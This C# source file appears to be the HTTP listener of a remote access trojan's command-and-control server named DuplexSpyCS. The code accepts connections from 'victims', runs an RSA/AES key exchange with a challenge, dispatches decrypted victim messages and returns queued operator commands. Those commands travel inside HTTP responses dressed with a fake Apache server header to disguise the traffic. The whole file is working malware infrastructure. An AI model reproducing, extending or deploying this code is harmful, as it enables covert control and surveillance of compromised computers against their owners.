using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Security;
using System.Text;
using System.Threading.Tasks;

namespace DuplexSpyCS
{
    public class clsHttpListener : clsListener
    {
        private Queue<clsHttpResp> m_qResponse = new Queue<clsHttpResp>();
        private TcpListener m_listener { get; set; }
        private CancellationTokenSource m_cts { get; set; }

        public clsHttpListener(string szName, int nPort, string szDescription)
        {
            m_szName = szName;
            m_nPort = nPort;
            m_szDescription = szDescription;
            m_protocol = enListenerProtocol.HTTP;

            m_listener = new TcpListener(IPAddress.Any, nPort);
            m_cts = new CancellationTokenSource();

            m_bIslistening = false;
        }

        public class clsHttpResp
        {
            private string szBody { get; init; }

            public clsHttpResp()
            {
                szBody = string.Empty;
            }

            public clsHttpResp(int nCmd, int nParam, string szMsg)
            {
                clsDSP dsp = new clsDSP((byte)nCmd, (byte)nParam, Encoding.UTF8.GetBytes(szMsg));
                szBody = Convert.ToBase64String(dsp.GetBytes());
            }

            public clsHttpResp(int nCmd, int nParam, byte[] abMsg)
            {
                clsDSP dsp = new clsDSP((byte)nCmd, (byte)nParam, abMsg);
                szBody = Convert.ToBase64String(dsp.GetBytes());
            }

            public clsHttpResp(string szMsg)
            {
                szBody = szMsg;
            }

            public byte[] fnGetBytes() => fnGetBytes(szBody);
            public byte[] fnGetBytes(byte[] abBuffer) => fnGetBytes(Convert.ToBase64String(abBuffer));
            public byte[] fnGetBytes(string szMsg)
            {
                string szBody = clsCrypto.b64E2Str(this.szBody);
                string szResp = $"" +
                    $"HTTP/1.1 200 OK\r\n" +
                    $"Server: Apache/1.3.27\r\n" +
                    $"Content-Type: text/html\r\n" +
                    $"content-length: {szBody.Length}\r\n\r\n" +
                    $"{szBody}";

                return Encoding.UTF8.GetBytes(szResp);
            }

            public byte[] fnGetBytes(int nCmd, int nParam, string szMsg)
            {
                clsDSP dsp = new clsDSP((byte)nCmd, (byte)nParam, Encoding.UTF8.GetBytes(szMsg));
                return fnGetBytes(dsp.GetBytes());
            }
        }

        ~clsHttpListener() => fnStop();

        public override void fnStart()
        {
            try
            {
                Socket sktSrv = m_listener.Server;
                var hSafe = sktSrv.SafeHandle;
                if (sktSrv == null || hSafe == null || hSafe.IsInvalid || hSafe.IsClosed)
                    m_listener = new TcpListener(IPAddress.Any, m_nPort);

                m_listener.Start();
                _ = Task.Run(() => fnAcceptLoop(m_cts.Token));
                m_bIslistening = true;

            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message, "fnStart()", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        public override void fnStop()
        {
            if (!m_bIslistening)
                return;

            try
            {
                m_cts.Cancel();
                m_listener.Stop();
                m_bIslistening = false;
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message, "fnStop()", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        public void fnEnqueue(byte[] abBuffer)
        {

        }
        public void fnEnqueue(clsHttpResp resp)
        {
            m_qResponse.Enqueue(resp);
        }

        public clsHttpResp fnGetResponse()
        {
            if (m_qResponse.Count == 0)
            {
                return new clsHttpResp("HTTP 500://Server internal error.");
            }
            else
            {
                return m_qResponse.Dequeue();
            }
        }

        public void fnReqHandler()
        {

        }

        private async Task fnAcceptLoop(CancellationToken ct)
        {
            while (!ct.IsCancellationRequested && m_bIslistening)
            {
                try
                {
                    var client = await m_listener.AcceptTcpClientAsync();
                    _ = Task.Run(() => fnHandleClient(client), ct);
                }
                catch (ObjectDisposedException) { break; }
                catch (Exception ex)
                {
                    Console.WriteLine($"[!] Accept error: {ex.Message}");
                }
            }
        }

        private async Task fnHandleClient(TcpClient client)
        {
            using (client)
            {
                NetworkStream stream = client.GetStream();
                clsHttpResp httpPkt = new clsHttpResp();
                clsVictim victim = new clsVictim(this, client.Client);
                string szVictimID = string.Empty;

                string[] key_pairs = clsCrypto.CreateRSAKey(); //Create RSA key pair.
                victim.key_pairs = (key_pairs[0], key_pairs[1]);
                string b64_PublicKey = clsCrypto.b64E2Str(victim.key_pairs.public_key);

                victim.Send(new clsHttpResp(1, 0, clsCrypto.b64E2Str(b64_PublicKey)).fnGetBytes());

                int nRecv = 0;

                do
                {
                    try
                    {
                        string request = await fnReadHttpRequest(stream);
                        nRecv = request.Length;
                        if (nRecv == 0)
                            break;

                        if (string.IsNullOrEmpty(request))
                            return;

                        string[] parts = request.Split(new[] { "\r\n\r\n" }, 2, StringSplitOptions.None);
                        string header = parts[0];
                        string body = parts.Length > 1 ? parts[1] : "";

                        int contentLength = 0;
                        foreach (string line in header.Split("\r\n"))
                        {
                            if (line.StartsWith("Content-Length:", StringComparison.OrdinalIgnoreCase))
                            {
                                string value = line.Substring("Content-Length:".Length).Trim();
                                int.TryParse(value, out contentLength);
                            }
                        }

                        if (body.Length < contentLength)
                        {
                            int remaining = contentLength - Encoding.UTF8.GetByteCount(body);
                            byte[] buffer = new byte[remaining];
                            int read = await stream.ReadAsync(buffer, 0, buffer.Length);
                            body += Encoding.UTF8.GetString(buffer, 0, read);
                        }

                        if (!string.IsNullOrEmpty(body))
                        {
                            byte[] abBuffer = Convert.FromBase64String(body);
                            clsDSP dsp = new clsDSP(abBuffer);

                            var headerInfo = dsp.GetMsg();
                            string szMsg = Encoding.UTF8.GetString(headerInfo.msg);

                            if (headerInfo.cmd == 0)
                            {
                                if (headerInfo.para == 0)
                                {

                                }
                            }
                            else if (headerInfo.cmd == 1)
                            {
                                if (headerInfo.para == 1)
                                {
                                    byte[] enc_aesData = dsp.GetMsg().msg;

                                    string enc_data = Encoding.UTF8.GetString(clsCrypto.RSADecrypt(enc_aesData, victim.key_pairs.private_key));
                                    string[] s = enc_data.Split('|');

                                    string key = s[0];
                                    string iv = s[1];

                                    victim._AES.key = Convert.FromBase64String(key);
                                    victim._AES.iv = Convert.FromBase64String(iv);
                                    string challenge = clsEZData.fnGenerateRandomStr();
                                    victim.challenge_text = challenge;
                                    string cipher_text = clsCrypto.AESEncrypt(challenge, victim._AES.key, victim._AES.iv);
                                    byte[] buffer = Encoding.UTF8.GetBytes(cipher_text);

                                    victim.Send(new clsHttpResp(1, 2, buffer).fnGetBytes());

                                    clsStore.sql_conn.WriteKeyExchange(victim, "Sent encrypted challenge");
                                }
                                else if (headerInfo.para == 3)
                                {
                                    byte[] enc_aesData = dsp.GetMsg().msg;
                                    string enc_data = clsCrypto.AESDecrypt(Convert.FromBase64String(Encoding.UTF8.GetString(enc_aesData)), victim._AES.key, victim._AES.iv);
                                    string payload = Encoding.UTF8.GetString(clsCrypto.RSADecrypt(Convert.FromBase64String(enc_data), victim.key_pairs.private_key));
                                    if (payload == victim.challenge_text)
                                    {
                                        victim.Send(new clsHttpResp(1, 4, clsCrypto.AESEncrypt(clsEZData.fnGenerateRandomStr(), victim._AES.key, victim._AES.iv)).fnGetBytes());
                                        DateTime datetime = DateTime.Now;
                                        victim.last_sent = datetime;
                                        victim.Send(new clsHttpResp(2, 1, clsCrypto.AESEncrypt(clsEZData.fnGenerateRandomStr(), victim._AES.key, victim._AES.iv)).fnGetBytes());

                                        clsStore.sql_conn.WriteKeyExchange(victim, "OK");
                                    }
                                }
                            }
                            else if (headerInfo.cmd == 2)
                            {
                                if (headerInfo.para == 0)
                                {
                                    var buffer = dsp.GetMsg();

                                    string dec_data = clsCrypto.AESDecrypt(Convert.FromBase64String(Encoding.UTF8.GetString(buffer.msg)), victim._AES.key, victim._AES.iv);
                                    string[] cmd = dec_data.Split("|");

                                    try
                                    {
                                        fnReceivedDecoded(this, victim, cmd.ToList());
                                    }
                                    catch (InvalidOperationException)
                                    {

                                    }
                                }
                                else if (headerInfo.para == 1)
                                {
                                    int nDelay = 1000;
                                    DateTime datetime = DateTime.Now;
                                    TimeSpan span = datetime - victim.last_sent;
                                    victim.latency_time = span.Milliseconds;
                                    victim.last_sent = datetime;
                                }

                                var pkt = fnGetResponse();
                                victim.Send(pkt.fnGetBytes());
                            }
                        }
                    }
                    catch (Exception ex)
                    {
                        MessageBox.Show(ex.Message);
                    }
                }
                while (nRecv > 0);

                fnDisconnected(victim);
            }
        }

        private async Task<string> fnReadHttpRequest(NetworkStream stream)
        {
            byte[] buffer = new byte[8192];
            MemoryStream ms = new MemoryStream();

            while (true)
            {
                int bytes = await stream.ReadAsync(buffer, 0, buffer.Length);
                if (bytes <= 0)
                    return string.Empty;

                ms.Write(buffer, 0, bytes);
                string data = Encoding.UTF8.GetString(ms.ToArray());

                if (data.Contains("\r\n\r\n"))
                    return data;

                if (ms.Length > 1024 * 1024 * 10)
                    throw new Exception("Request too large.");
            }
        }
    }
}
